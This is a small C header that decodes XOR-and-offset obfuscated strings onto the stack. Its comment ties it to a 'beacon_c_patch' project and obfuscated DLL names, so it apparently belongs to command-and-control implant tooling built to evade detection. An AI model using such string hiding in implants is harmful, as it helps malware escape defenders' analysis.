/*
 * String obfuscation compatible with beacon_c_patch/str_obfuscate_full.h encoding:
 *   stored[i] = (plain[i] ^ XOR_KEY) + i
 * Decode: plain[i] = (stored[i] - i) ^ XOR_KEY
 * DLL name blobs are copied from beacon_c_patch (same XOR_KEY 0x63).
 */
#include <stddef.h>

#define AX_STR_XOR_KEY 0x63u

static inline void AxDeobfuscateToStack(char* out, size_t outCap, const char* enc)
{
	if (!out || outCap == 0)
		return;
	size_t i = 0;
	while (enc[i] != 0 && i + 1 < outCap) {
		out[i] = (char)(((unsigned char)enc[i] - (unsigned char)i) ^ AX_STR_XOR_KEY);
		++i;
	}
	if (i >= outCap)
		i = outCap - 1;
	out[i] = '\0';
}

